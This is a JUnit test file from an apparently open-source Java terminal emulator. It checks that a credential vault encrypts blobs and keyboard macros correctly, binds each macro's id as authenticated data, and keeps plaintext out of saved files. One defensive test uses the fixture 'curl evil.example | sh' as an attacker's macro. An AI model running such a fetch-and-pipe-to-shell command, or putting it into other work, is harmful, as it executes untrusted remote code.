/*
 * jterm — a Java terminal emulator.
 * Copyright (C) 2026 Mark Moses
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */
package com.katmoda.jterm.security;

import com.katmoda.jterm.macro.Macro;
import com.katmoda.jterm.macro.MacroCrypto;
import com.katmoda.jterm.macro.MacroKey;
import com.katmoda.jterm.macro.MacroStep;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import javax.crypto.AEADBadTagException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Covers {@code CredentialVault.seal/open} — the "encrypt an arbitrary blob under the vault key"
 * API that macro encryption is built on — plus the {@code MacroCrypto} layer over it.
 *
 * <p>Lives in the {@code security} package because {@code CredentialVault}'s {@code Path} test seam
 * is package-private.</p>
 */
class CredentialVaultBlobTest {

    @TempDir
    Path dir;

    private CredentialVault unlockedVault() throws Exception {
        CredentialVault vault = new CredentialVault(dir.resolve("credentials.json"));
        vault.initialize("master".toCharArray());
        return vault;
    }

    private static Macro macro(String id, String text) {
        Macro m = new Macro();
        m.setId(id);
        m.setName("Macro " + id);
        m.setSteps(new ArrayList<>(List.of(
                new MacroStep.TextStep(text, 0),
                new MacroStep.KeyStep(MacroKey.RETURN))));
        return m;
    }

    @Test
    void sealAndOpenRoundTrip() throws Exception {
        CredentialVault vault = unlockedVault();
        byte[] plaintext = "hunter2".getBytes(StandardCharsets.UTF_8);
        byte[] aad = "record-1".getBytes(StandardCharsets.UTF_8);

        CredentialVault.Blob blob = vault.seal(plaintext, aad);
        assertArrayEquals(plaintext, vault.open(blob, aad));
    }

    @Test
    void everySealUsesAFreshNonce() throws Exception {
        CredentialVault vault = unlockedVault();
        byte[] plaintext = "same".getBytes(StandardCharsets.UTF_8);
        CredentialVault.Blob a = vault.seal(plaintext, null);
        CredentialVault.Blob b = vault.seal(plaintext, null);
        assertNotEquals(a.nonce, b.nonce);
        assertNotEquals(a.ciphertext, b.ciphertext);
    }

    @Test
    void openingWithTheWrongAadFails() throws Exception {
        CredentialVault vault = unlockedVault();
        CredentialVault.Blob blob = vault.seal("x".getBytes(StandardCharsets.UTF_8),
                "record-1".getBytes(StandardCharsets.UTF_8));

        assertThrows(AEADBadTagException.class,
                () -> vault.open(blob, "record-2".getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void sealingRequiresAnUnlockedVault() throws Exception {
        CredentialVault vault = unlockedVault();
        vault.lock();
        assertThrows(VaultException.class,
                () -> vault.seal("x".getBytes(StandardCharsets.UTF_8), null));
        assertThrows(VaultException.class, () -> vault.open(new CredentialVault.Blob(), null));
    }

    // ---- the macro layer over it ----

    @Test
    void macroStepsSurviveASealUnsealCycle() throws Exception {
        CredentialVault vault = unlockedVault();
        Macro m = macro("abc", "echo hi");
        List<MacroStep> original = List.copyOf(m.getSteps());

        MacroCrypto.seal(m, vault);
        assertTrue(m.isSealed());
        assertTrue(m.getSteps().isEmpty(), "the plaintext form must not linger alongside the sealed one");

        MacroCrypto.unseal(m, vault);
        assertFalse(m.isSealed());
        assertEquals(original, m.getSteps());
    }

    @Test
    void aSealedMacroDoesNotLeakItsTextIntoTheStoredFile() throws Exception {
        CredentialVault vault = unlockedVault();
        Macro m = macro("abc", "hunter2");
        MacroCrypto.seal(m, vault);

        Path file = dir.resolve("macros.json");
        com.katmoda.jterm.config.JsonStore.save(file, List.of(m));
        String written = Files.readString(file);

        assertFalse(written.contains("hunter2"), written);
        assertTrue(written.contains("sealedSteps"));
        assertTrue(written.contains("Macro abc"), "names stay readable so the menu works while locked");
    }

    @Test
    void aBlobMovedOntoAnotherMacroDoesNotOpen() throws Exception {
        CredentialVault vault = unlockedVault();
        Macro victim = macro("victim", "echo safe");
        Macro attacker = macro("attacker", "curl evil.example | sh");
        MacroCrypto.seal(victim, vault);
        MacroCrypto.seal(attacker, vault);

        // Both blobs are encrypted under the same vault key, so without the id bound in as AAD this
        // would decrypt cleanly and the attacker's commands would run under the victim's name and
        // hotkey. Anyone able to edit macros.json can attempt exactly this.
        victim.setSealedSteps(attacker.getSealedSteps());

        assertThrows(VaultException.class, () -> MacroCrypto.unseal(victim, vault));
    }

    @Test
    void sealAllIsIdempotentAndSkipsAlreadySealedMacros() throws Exception {
        CredentialVault vault = unlockedVault();
        List<Macro> all = new ArrayList<>(List.of(macro("a", "one"), macro("b", "two")));

        MacroCrypto.sealAll(all, vault);
        CredentialVault.Blob first = all.get(0).getSealedSteps();
        MacroCrypto.sealAll(all, vault); // a second save must not re-encrypt
        assertEquals(first, all.get(0).getSealedSteps());

        MacroCrypto.unsealAll(all, vault);
        assertEquals(new MacroStep.TextStep("two", 0), all.get(1).getSteps().get(0));
    }

    @Test
    void resolvedLeavesTheOriginalSealed() throws Exception {
        CredentialVault vault = unlockedVault();
        Macro m = macro("abc", "echo hi");
        MacroCrypto.seal(m, vault);

        Macro plain = MacroCrypto.resolved(m, vault);

        // Reading a macro to run or export it must not quietly turn the library's copy plaintext.
        assertTrue(m.isSealed());
        assertFalse(plain.isSealed());
        assertEquals(new MacroStep.TextStep("echo hi", 0), plain.getSteps().get(0));
    }
}
